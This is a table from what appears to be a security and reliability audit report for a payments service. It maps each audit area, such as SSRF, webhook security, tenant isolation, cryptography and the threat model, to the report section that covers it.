| DO concurrency scenarios (withdraw×2, refund×2, capture×2, complete×2) | §8.3–8.7 + Annex 15 |
| Idempotency audit (validation, composite, 5 collision cases) | EDGE-P1-001 + Annex 15.1 |
| Tenant isolation audit (grep + trace, SELECT/INSERT/UPDATE/DELETE/UPSERT/JOIN) | §14 + Annex 3 |
| SQL/D1 audit (interpolation, binds, constraints, indexes) | §8.5, Annex 3, Annex 5 |
| Migration audit (idempotency, rollback, expand/contract, per-table) | §25.3 + Annex 5 |
| Money representation audit (floats, 2^53, regex, precision, currency) | §9.7 + validation.ts + P2-018/019 |
| Gateway abstraction audit (ENABLED_GATEWAYS fail-closed, timeouts, error classification, unknown-outcome) | §4 + Annex 6 |
| SSRF audit (private ranges, IPv6, redirect, rebinding, mockup) | EDGE-P1-004 + Annex 6 |
| Webhook security audit (IP/geo/raw-body/timing/replay/dedup/size) | §9.6 + EDGE-P1-003 |
| SMS corroboration audit (12 adversarial cases + sequence) | §10 EDGE-P0-007 + Annex 1.3 |
| Cryptography audit (AES-GCM, HMAC, hashes, MD5 classification, key mgmt) | §9.7 + Annex 6 |
| Secrets audit (searches, history, redaction) | §25 (values redacted per the brief) |
| XSS/injection audit (contextual escaping: HTML/attr/URL/JS/CSS/JSON) | EDGE-P0-006 + Annex 1.5 |
| Security headers + CSRF | §5.1, P2-001, P0-006 |
| Rate limiting (identity dimensions, fail-open/closed, IPv6/NAT) | §9.4 + EDGE-P1-010 |
| Queue/workflow/cron reliability (per-task: schema/dedupe/retry/DLQ/poison) | §5.2, §15, Annex 4.7/4.8 |
| Failure-mode review per dependency (slow/unavailable/partial/malformed/500/recovery) | §6 + §15 |
| Timeout audit (fetch/Promise.race/AbortController/setTimeout) | §15 (Timeouts row) + P2-011/020 |
| Observability (can it answer the 8 money questions) | §27 + Annex 8 |
| Data retention/privacy | §26 |
| Supply chain | §24 |
| Static searches (the mandated grep battery, manually reviewed) | Appendix C + §1.3 |
| Test execution (all suites + focused) | §2.1 |
| Temporary audit tests where appropriate | specified as required-tests per finding + G-register + Annex 7 (not committed — audit rule) |
| STRIDE threat model | §18 + Annex 13 |
| Attack tree + financial failure tree | §19/§20 |
| Architecture/data-integrity/stability improvement audits | §28 |
| Prior audit verification table (FIXED/PARTIALLY/REGRESSED/NOT FIXED/NOT VERIFIABLE) | §22 + Annex 9 |
| Finding severity model applied without inflation | Annex 18 |
| Final verdict standard (PRODUCTION READY / WITH CONDITIONS / NOT READY + what blocks) | §30 |
| Audit discipline checklist | Appendix B |
| 20 non-negotiable questions | §21 |
